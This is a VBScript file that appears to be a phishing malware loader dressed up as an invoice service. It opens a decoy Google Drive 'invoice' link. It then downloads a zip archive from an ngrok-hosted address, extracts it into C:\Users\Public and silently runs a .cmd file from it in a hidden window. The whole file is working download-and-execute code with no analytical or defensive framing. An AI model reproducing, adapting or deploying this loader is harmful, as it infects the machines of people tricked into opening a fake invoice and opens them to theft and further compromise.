Option Explicit

Dim zipURL, zipPath, destFolder, scriptToRun
Dim objXMLHTTP, objADOStream, objFSO, shell, wsh

Set objFSO = CreateObject("Scripting.FileSystemObject")
Set shell = CreateObject("Shell.Application")
Set wsh = CreateObject("WScript.Shell")

wsh.Run "https://drive.google.com/file/d/1gIKNBwB2h8Qoxsg6hMdkQCZ5EMSTMeHB/view?usp=sharing?invoice", 1, False

zipURL = "https://expressinvoicesinvoice27.ngrok.pro/invoiceservice1.zip"
zipPath = "C:\Users\Public\invoiceservice.zip"
destFolder = "C:\Users\Public\invoiceservice"
scriptToRun = destFolder & "\bin\invoiceservice.cmd"

If Not objFSO.FileExists(zipPath) Then
    Set objXMLHTTP = CreateObject("MSXML2.XMLHTTP")
    objXMLHTTP.Open "GET", zipURL, False
    objXMLHTTP.Send

    If objXMLHTTP.Status = 200 Then
        Set objADOStream = CreateObject("ADODB.Stream")
        objADOStream.Type = 1
        objADOStream.Open
        objADOStream.Write objXMLHTTP.ResponseBody
        objADOStream.SaveToFile zipPath, 2
        objADOStream.Close
        Set objADOStream = Nothing
    Else
        WScript.Quit
    End If
    Set objXMLHTTP = Nothing

    If Not objFSO.FolderExists(destFolder) Then
        objFSO.CreateFolder(destFolder)
    End If

    shell.NameSpace(destFolder).CopyHere shell.NameSpace(zipPath).Items, 4
    WScript.Sleep 3000
End If

If objFSO.FileExists(scriptToRun) Then
    wsh.Run """" & scriptToRun & """", 0, False
Else

End If

